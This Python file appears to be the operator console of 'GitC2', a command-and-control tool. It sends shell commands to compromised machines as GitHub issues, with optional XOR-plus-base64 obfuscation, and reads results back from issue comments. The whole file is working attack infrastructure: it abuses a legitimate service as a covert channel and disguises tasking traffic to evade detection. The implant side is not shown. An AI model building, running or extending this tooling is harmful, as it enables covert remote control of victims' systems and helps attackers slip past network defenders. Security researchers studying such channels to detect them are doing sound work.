import os
import json
import time
import requests
import base64
import itertools

CONFIG_FILE = "settings.json"

def print_banner():
    print("""
 ██████╗ ██╗████████╗     ██████╗██████╗ 
██╔════╝ ██║╚══██╔══╝    ██╔════╝╚════██╗
██║  ███╗██║   ██║       ██║      █████╔╝
██║   ██║██║   ██║       ██║     ██╔═══╝ 
╚██████╔╝██║   ██║       ╚██████╗███████╗
 ╚═════╝ ╚═╝   ╚═╝        ╚═════╝╚══════╝
         github.com/N3agu/GitC2
""")

def xor_crypt(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, itertools.cycle(key)))

def encode_payload(text, key):
    xored = xor_crypt(text, key)
    return base64.b64encode(xored.encode('utf-8')).decode('utf-8')

def decode_payload(b64_text, key):
    try:
        xored = base64.b64decode(b64_text).decode('utf-8')
        return xor_crypt(xored, key)
    except Exception:
        return "[!] Failed to decode payload. Data might be corrupted or unencrypted."

def load_or_create_config():
    required_keys = ["token", "owner", "repo", "encrypt_communication"]
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                config = json.load(f)
            if all(key in config for key in required_keys):
                return config
            else:
                print("[!] settings.json is missing fields. Recreating...")
        except json.JSONDecodeError:
            print("[!] settings.json is malformed. Recreating...")

    print("[!] Configuration not found. Setting up GitC2.")
    print("\n[i] HOW TO OBTAIN A GITHUB TOKEN:")
    print("    1. Go to github.com -> Settings -> Developer settings -> Personal access tokens -> Tokens (classic)")
    print("    2. Generate a new token (classic)")
    print("    3. Write a note for the token (\"GitC2 Token\") and select the scope \"repo\"")
    print("    4. Click on \"Generate Token\"\n")
    
    token = input("[+] GitHub Token: ")
    owner = input("[+] Repository Owner: ")
    repo = input("[+] Repository Name: ")
    enc_input = input("[+] Encrypt Communication (y/n): ").strip().lower()
    encrypt = True if enc_input == 'y' else False
    
    config = {"token": token, "owner": owner, "repo": repo, "encrypt_communication": encrypt}
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)
    print("[!] Settings saved to settings.json\n")
    return config

def main():
    print_banner()
    config = load_or_create_config()
    
    headers = {
        "Authorization": f"token {config['token']}",
        "Accept": "application/vnd.github.v3+json"
    }
    base_url = f"https://api.github.com/repos/{config['owner']}/{config['repo']}/issues"
    
    encrypt_enabled = config.get("encrypt_communication", False)
    token_key = config['token']

    print(f"[*] Encryption: {'ENABLED' if encrypt_enabled else 'DISABLED'}\n")

    while True:
        try:
            cmd = input("GitC2> ")
            if cmd.lower() in ['exit', 'quit']:
                break
            if not cmd.strip():
                continue

            payload_body = encode_payload(cmd, token_key) if encrypt_enabled else cmd
            payload = {"title": "Task", "body": payload_body}
            res = requests.post(base_url, headers=headers, json=payload)
            
            if res.status_code != 201:
                print(f"Failed to dispatch task: {res.text}")
                continue
            
            issue_number = res.json()["number"]
            print(f"[*] Task dispatched to Issue #{issue_number}. Polling for response...")

            while True:
                time.sleep(5)
                check_res = requests.get(f"{base_url}/{issue_number}", headers=headers)
                
                if check_res.status_code == 200:
                    issue_data = check_res.json()
                    if issue_data["state"] == "closed":
                        comments_res = requests.get(f"{base_url}/{issue_number}/comments", headers=headers)
                        if comments_res.status_code == 200:
                            comments = comments_res.json()
                            if comments:
                                raw_body = comments[-1]['body']
                                final_body = decode_payload(raw_body, token_key) if encrypt_enabled else raw_body
                                print(f"\n[+] Response received:\n{final_body}\n")
                            else:
                                print("\n[-] Task closed, but no output returned.\n")
                        break
        except KeyboardInterrupt:
            print("\nExiting GitC2...")
            break

if __name__ == "__main__":
    main()